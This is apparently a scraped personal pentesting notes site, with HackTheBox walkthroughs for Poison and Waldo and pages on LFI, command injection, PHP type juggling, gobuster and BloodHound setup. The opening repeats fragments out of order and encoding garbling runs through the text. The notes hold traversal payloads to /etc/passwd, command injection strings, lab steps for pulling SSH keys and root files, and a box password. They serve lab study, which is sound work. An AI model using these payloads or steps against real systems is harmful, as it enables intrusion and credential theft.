As you‚Äôll have to investigate the PHP scripts one by one. listfiles.php has an interesting new piece of information. Go back to the default webpage and enter PWDBACKUP.TXT.

Port 22 could be the initial foothold. Google apache 2.2.22 https vulns nothing crazy pops out. PHASE 2‚Ää‚Äî‚ÄäGOBUSTER /wpscan gobuster -u http://10.10.10.79 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-mediuml.txt -t 50 return vulnerable to OpenSSL hearbleed PHASE 3 Manual investigation of the webpage
  Waldo WALDO Instead of giving binaries system-wide permissions, give them the permissions they need to do the job. Skipping past Nmap, after messing around with the request‚Äôs found three request fileWrite, dirRead, fileRead. FileWrite writes user-supplied input to list1. dirRead will enumerate directories and print out the content. fileRead needs the exact file path to work. Sqlmap, Wfuzz didn‚Äôt work I had more success with wfuzz but I couldn‚Äôt filter the output.
  ```

Welcome, to my repository of knowledge, HACKTHEBOXon walkthroughs, pentesting tools & concepts. The top right you will find social links. to the left or top, you should see navigation depends on the platform.

title: Local File inclusion
content:
Local file inclusion is pretty rare as it requires bad coding but it does happen. This vulnerability occurs when system commands or unsanitized user input or written into how the web server handles user input. Basically, you escape out of the current string and your commands get executed. This only grants you the access the web app has. So if the PHP script has permissions for www-data which is a web server user. You won’t be able to access anything with elevated permissions. Before you start thinking PHP is the bad guy I want to go ahead and say all of the webpage languages are vulnerable.
Word list for lfi can be found in seclist: /Seclist/Fuzzing/LFI-JHADDIX.txt
….//….//….//etc/passwd
/../../etc/passwd
/..../..../..../..../..../..../etc/passwd
/…/…/…/…/…/etc/passwd
\‚Ä¶..\\‚Ä¶..\\‚Ä¶..\\etc\passwd
 Often there will be filters in place, and then the job becomes understanding how the information is being filtered. If you’d like to see how PHP script in waldo handled user input read the WALDO write-up. You can also use burp to test for LFI I would recommend it makes it really convenient to test. in POISON there weren’t any filters in place so the standard escaped worked. (examples later) The web form allowed you to read local files, but once you escaped out of the directory supplying more data than the script can handle. You could read more.

title: BloodHound Neo4j
description: setting up bloodhound in a Debian environment
content:
TAKE A SNAPSHOT BEFORE ATTEMPTING THIS.
I would highly recommend installing Neo4j using the repository. Neo4j is a database for bloodhound API. I had a couple of issues installing this. had some issues with multiple versions of Java running. currently, neo4k only runs on Java 8 kali currently comes with 11.x. need to tell java to use the legacy version. Next, need to add the repository to download neo4j.
##### echo "deb http://httpredir.debian.org/debian jessie-backports main" | sudo tee -a /etc/apt/sources.list.d/jessie-backports.list apt-get update ##### apt-get -t jessie-backports install ca-certificates-java ##### take the output and put it after set <java8bane> update-java-alternatives --list ##### currently update-java-alternatives --jre --set <java8name> ##### update repo wget -O - https://debian.neo4j.org/neotechnology.gpg.key | sudo apt-key add - echo 'deb https://debian.neo4j.org/repo stable/' | sudo tee -a /etc/apt/sources.list.d/neo4j.list sudo apt-get update ###### neo4j start -- background neo4j console -- foreground  BloodHound
go to the desirded location you wish to set this up. For me a have a tool directory. ##### this is already compiled ready to go git clone https://github.com/BloodHoundAD/BloodHound.git cd BloodHound wget https://github.com/BloodHoundAD/BloodHound/releases/download/2.0.4/BloodHound-linux-x64.zip unzip BloodHound-linux-x64.zip ./Bloodhound if you get a white screen hit these keys ( crtl + r ) #### For a lager selection of compiled bloodhound releases. https://github.com/BloodHoundAD/BloodHound/releases  I changed the password before I got to this part. So I will be using screenshots from ippsecs video. when you first setup bloodhound and enter some creds it’ll ask you to go to localhost:7687 to change the password. go to your browser and type it in. the default creds for neo4j are neo4j and it won’t let you in until you change the password which is nice a feature.
bloodhound login
initial neo4j browser page
change your password
If you’d like to install from the repo use this guide
https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/ references and thanks https://www.youtube.com/watch?v=ob9SgtFm6_g&t=21s https://neo4j.com/docs/operations-manual/current/installation/linux/debian/ https://0xdf.gitlab.io/2018/11/10/htb-reel.html

title: FTP
content:
File transfer protocol is a terrible service and you should never run it without some kind of protection in front of it. I’ve bumped into quite a few boxes running FTP. I often forget all the commands you can run with ftp.
mget * download everything in the directory get download file / documents put upload file / documents nmap (maybe even in intereactive mode)  SSHFS & SFTP
SSHFS is built on SFTP. SFTP use‚Äôs the SSH protocol for added security to FTP. SSHFS allows you to mount to the file system. This gives you more options when interacting with the host. If SSH is available on the host you can use SFTP or SSHFS.
apt-get install sshfs -y sshfs -p 2222 user@ip_address: /mnt/nightmare/ find . -ls 2>/dev/null > ~/out/put/directory.txt <-- takes forever grep file.txt ~/out/put/directory.txt

title: GoBuster
content:
Go Buster  Gobuster is a tool often used to enumerate web directories. It offers more power than dirb & dirbuster. You dont have to use the extension switch all the time and it may not be necessary. I would recommend limiting extensions to whats relevant.
Enumerating Directories gobuster -u http://TARGET_IP:PORT -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100
-t for threads can go as high as 200, 100 is kind of to much 40 is perfect for multiple things going on.
-s “200,204,301,302,307,404” errors to look for you can edit these
-w medium or small
-x extensions Linux php html txt doc Windows aspx asp php
-fw force wild card
Adding SessionID this can be easily overlooked.
-c PHPSESSIONID=1324567890
Enumerating Browser User Agent Burp Proxy User Agent (certain browser Sufarri, FireFox, Chrome, IE). Some webservers can be configred to only accept a certain browser.
gobuster -u http://target:port -a ‘agent’ -w wordlists -t 100
Adding multple extentions
-x php,aspx,asp,html,doc,txt

title: HeartBleed
content:
Heart bleed is an OpenSSL vulnerability that allows the attacker to ÔøΩbleedÔøΩ out whatever in memory on the server. You can also dump the TSL/SSL cert for the webpage. You can modify the exploit to continuously extract data at 64 bytes at a time. Messing around with the POC was tricky the c code has all these errors and wonÔøΩt compile arg, luckily for me, Metasploit has the solution.
Proff of concept https://www.exploit-db.com/exploits/32745/
Metasploit: https://www.rapid7.com/db/modules/auxiliary/scanner/ssl/openssl_heartbleed

title: Miscellaneous
content: Setting up Test Enviroment or Complicated tools.

title: Nmap
content: Nmap is a port scanning tool that can enumerate devices operating systems and even run scripts that intrusive. Allot of tools have a wide range of abilities but specialize at one thing. Nmap uses ping sweeps and a lot of math to figure everything out. For example based ping time to live, you can figure out the operating system based on how lit takes to handle the information ~128 windows ~64 Linux.

title: OS Command Injection
content:
No, probably not what your thinking. I‚Äôm talking about web app pen-testing. A lot of programming languages are vulnerable, to command injection via webpage. The user supplies OS commands that are escaped and executed. This is due to not properly sanitizing user input or elements aren‚Äôt hard coded allowing for exploitation. Below are the characters to sanitize.
| && ‚Ä¶ ; `(tilda) > < \ !  This vulnerability can occur by using as owsp puts it Dangerous API, or using system commands inside a script that handles users supplied input.
PHP system exec eval shell_exec ASP.NET HttpRequest.Params HttpRequest.Url HttpRequest.Item EXAMPLES hackthebox.eu/index.php?exec=ls index.php?shell_exec=c3ViMmlw;ls index.php?shell_exec=c3ViMmlw||ls POST request tester=c3ViMmlw|ls tester=c3ViMmlw||ls tester=c3ViMmlw;ls tester2=c3ViMmlw&&ls < -- in some scenario you'll need to encode theses values  FOR MORE INFORMATION PLEASE FOLLOW THESES LINKS
https://null-byte.wonderhowto.com/how-to/use-command-injection-pop-reverse-shell-web-server-0185760/
Testing for Command Injection (OTG-INPVAL-013) - OWASP *OS command injection is a technique used via a web interface in order to execute OS commands on a web server. The user‚Ä¶*www.owasp.org
https://www.owasp.org/index.php/Command_Injection

title: PHP Typw Juggling
content:
PHP Type Juggling
This article will cover PHP type juggling, and some different ways i have encountered it on hackthebox .
PHP has two comparisons; loose (==, =!) and strict (===). Strict comparison 1 = 1, but in loose 1 could mean many things 1 could equal true or 1. Meaning that there multiple meaning for the values used. This is a built in feature for PHP to force type conversion into specific data type.
PHP loose comparison does this to accommodate different data types for example; ‚Äò9‚Äô is different from 9. Adding the two data types in PHP will result in 18. In other languages like python will not accommodate such errors. PHP does this so the program might run as it was expected to. Accommodating human errors. Below are some examples of loose comparison.
'0e1234' == '0e4321' '0e1234' == '0' '0e1234' <= '1' '0xf' == '15' #0xf in hexadecimal notation is 15  when php compares a string to a interger it has some weird quirks.
'000...000' == int(0) '0e0...000' == int(0) '1e0...000' == int(1) 'abc...000' == int(0) # if a string starts with a non numerical character it will default to int(0)  Another example is when PHP try‚Äôs to interpreter a string and its converted into PHP exponential notation 0e‚Å∞¬≤¬≥‚Å¥¬≤‚Å∂¬≤¬≥‚Å¥¬≤¬≤‚Å¥¬π¬≤‚Åµ¬π‚Å∂‚Å∑‚Å∏‚Åπ 0e¬≤¬≥‚Å¥¬≤‚Å∂¬≤¬≥‚Å¥¬≤¬≤‚Å¥¬π¬≤‚Åµ¬π‚Å∂‚Å∑‚Å∏‚Åπ equates to int(0) as well. If the number after the first letter is 0 it will remove the leading zero.
In the above examples the entire string is converted into a numerical value, or something completely different. Confusing I know but here are some popular charts that show how loose comparison works.
The Encounters
phpsession, cookies, & passwords are susceptible to PHP type juggling. Allowing the attacker to take advantage of a PHP feature to gain access to valid user accounts. From what I have read, the attacker randomly generates cookies. Trying to predict the next cookie. The more random(entropy) the targets cookies have, the harder it is to preform this attack.
In the below example, PHP will convert both of the md5 hashes into integers. It will then compare the two values based on the integer. Even though the two hash are different they are both treated as value.
submited cookie aa6fw‚Ä¶34tj4343 = 0 stored cookie ff6dj..w221.5885m = 0  This is also applicable to PHP authentication
stored password e0rj238r submited password e0mfwewl  References:
https://pen-testing.sans.org/blog/2014/12/18/php-weak-typing-woes-with-some-pontification-about-code-and-pen-testing https://0xdf.gitlab.io/2018/06/23/htb-falafel.html#php-type-juggling-intro https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/ https://www.whitehatsec.com/blog/magic-hashes/

title: Poison
content:
PHASE 1 NMAP
nmap -sC -sV -Pn -oA initial_poison 10.10.10.84  port 22 ssh it can be a rabbit-hole.
port 80 webpage apache 2.4.29 (FreeBSD) PHP/ 5.6.32
port 514 hmm
PHASE 2 LFI
Manually inspect the webpage this is kind of tedious. As you‚Äôll have to investigate the PHP scripts one by one. listfiles.php has an interesting new piece of information. Go back to the default webpage and enter PWDBACKUP.TXT.
next step you will have to decode this secure password.txt. I‚Äôd like to note that md5(TMOBILE ‚Ä¶COUGH), base64 are not encryption algorithms because it lacks a key. I used Cyberchef to decode the message 13 times. The interface for Cyberchef made it easy. tool‚Ää‚Äî‚Äähttps://gchq.github.io/CyberChef/
Charix!2#4%6&8(0
PHASE 3 SSH :ü§£
This time it wasn‚Äôt a rabbit hole. Lady luck was on our side as the developer left those passwords out and about. Have to guess what the username is. It‚Äôs not poison, after a while, I got it right charix is the username.
secret.zip user.txt  Need to move secret.zip off of the machine to unzip the file gzip isn‚Äôt available on the machine. YOU WILL NEED TO CHANGE READ PERMISSIONS
python3 -m http.server 8081 wget http://10.10.10.84:8081/secret.zip chmod 400 secret  python may not always be available on the host.
File transfer for NetCat this tool will transfer a file to the other session the > overwrites the file your nc -l -p 8081 > directory_path fromt target nc 10.10.14.3 8081 > secret.zip  What is the point of secret? after banging my head for a while. I decided to just for the laughs and tried Netstat and see if any services were running. By George did I. WAIT//// WHAT THIS LOCALHOST, ARG!!!!!!
netstat -na |grep -i LISTEN  PHASE 4 SSH AGAIN
Yeah, didn‚Äôt know this before this box but you can ssh into localhost.
SSH port forwarding is a neat tool to get access to the Localhost through an ssh connection. Well, that‚Äôs what well be using it for. Source port would be for example 8080 destination port would 80 if you wanted to connect to a web server It could take 20 seconds for it to connect also nothing really happens. BE PATIENT!!!!!
-L PORT1:IP: PORT2 tells ssh that you want it to listen on your host port PORT1. any traffic that comes to your host PORT1, send it through the ssh connection, and then from the host, you‚Äôre smashed into, send it from that host to IP:PORT2
concept
the juice. it‚Äôs a secret guess
PHASE 5 FINALE
port 5801 is associated with Vncviewer.

title: SSHuttle
content:
Sshuttle Creates a VPN connection using the SSH protocol; forwarding all traffic to the target’s network. It has a lot of options/switches to use but by default, they are set to auto/detect. So typically you won’t need most of them.
Something to note you will need root access to run sshuttle; be sure to test the connection before wildly connecting.
Connecting to a router with enabled ssh will give you access to the whole network. That is typical of VPN anyways.
sshuttle -r chicken@192.168.1.6 172.16.42.1
-r –remote

title: WFUZZ
content:
WFUZZ
WFUZZ is a powerful fuzzer, you can enumerate directories, Wierd directories. You can also use it for bruteforcing passwords, look for Lfi, I could keep going. This is a swiss army knife it doesn’t beat manual enumeration. Becoming depending on this tool to look for SQL injection can lead you to miss something obvious.

title: Waldo
content:
WALDO
Instead of giving binaries system-wide permissions, give them the permissions they need to do the job.
Skipping past Nmap, after messing around with the request‚Äôs found three request fileWrite, dirRead, fileRead. FileWrite writes user-supplied input to list1. dirRead will enumerate directories and print out the content. fileRead needs the exact file path to work.
Sqlmap, Wfuzz didn‚Äôt work I had more success with wfuzz but I couldn‚Äôt filter the output. Nothing I tried allowed me to escape the current directory. Examining what‚Äôs available the PHP source code that‚Äôs running the website. The PHP script appears to call a bunch of functions from the PHP library =D. REQUEST_METHOD determines whether the request was a post or a get === strict comparison to POST request. the first few parts of the stript involve telling the browser what kind of data to expect Content-Type. ‚Äústr_replace‚Ää‚Äî‚ÄäReplace all occurrences of the search string with the replacement string‚Äù str_replace takes every occurrence of the the subject and replaces those values with replace. Mixed str_replace ( mixed $search , mixed
It finds ../ or ..\‚Äù it will replace them with nothing the two quotes in replace represent nothing. the next part say if file name === (strict) user.txt print false(no user.txt) . /n/t/t, /n newline /tab /tab json_encode($filecontent) is taking the var file content and encoding the output(that will matter later) taking all this into consideration the script only checks for ../ or ..\ anything else it find‚Äôs, it‚Äôll ignore. I tried encoding these in every possible way. Then I was reading about LFI and saw it ‚Ä¶.// yes the holy grail. ‚Ä¶.//‚Ä¶.//‚Ä¶.// escaped out and allowed for directory traversal.
I didn‚Äôt see .ssh at first because I‚Äôve seen it before. when trying to view .ssh with fileRead it spat out is a directory noticed the output with request differs from .ash_history. bash_history produces false .ssh produced a file. Plug that into fileRead. Then you should find ssh private key!!! the format all fudged. using vim repeat I was able to clean up the file. when editing the file \n is not a null character, it means newline in JSON. need to also get rid of ‚Äú\‚Äù this part was also tricky because of these two ports 9000 8888 rabbit holes. Netstat -antp after looking at it for a while noticed some of the ssh connection came from local address rcf-1904 address from localhost weird. That was the next big hint. Since the .monitor file is local now it‚Äôll make it easier to use. the next username is monitor. Next were cast into a restricted environment (jail) to get out of this use the -t switch in ssh -t (bash‚Ää‚Äî‚Äänoprofile). Lots of rabbit holes & some useless tools.
ssh monitor@waldo -i .monitor -t "bash --noprofile"  PERMISSIONS
-rwSr--r-- 1 root root first s is the suid bit the capital S denotes the file isn't executable. -rwsr-sr-x 1 root root first s is the suid bit second is the guid bit sticky bit the file gets its permissions from the parent directory  The for mentioned permissions are system-wide can have unintended effects that can often lead to getting root access in one way or another. If the binaries only need to read files with root permissions. Theirs this thing called capabilities. where the file is given limited permission as root. There is a whole a lot of different ones to choose from the one we‚Äôre interested in is.
/usr/bin/tac = cap_dac_read_search  Allows the binary to read files as root. It took a while to find the tools full path getcap basically the find command for Linux capabilities.
/sbin/getcap -r / 2>/dev/null. If you don‚Äôt run it with dev/null it‚Äôll kind of lead you to the .monitor script but we want tac. tac just cat but in reverse lol. cat /root/root.txt  Conclusion
Instead of giving binaries system-wide permissions, give them the permissions they need to do the job.

title: ssh
content:
SSH - secure shell Is a commonly used port/service. In fact, it is almost on every Linux Box on hackthebox. Network administrators use it to remotely managing Network Peripherals. There are a couple CVE’s out there for older version 7.3 Open Ssh is vulnerable to a user enumeration attack.
SSH will commonly use sha-256 encryption to encrypt the traffic. The encryption Bit-Key is commonly set at 2048.
Start Service
vi /etc/ssh/sshd_conf PermitRootLogin yes service ssh start</c
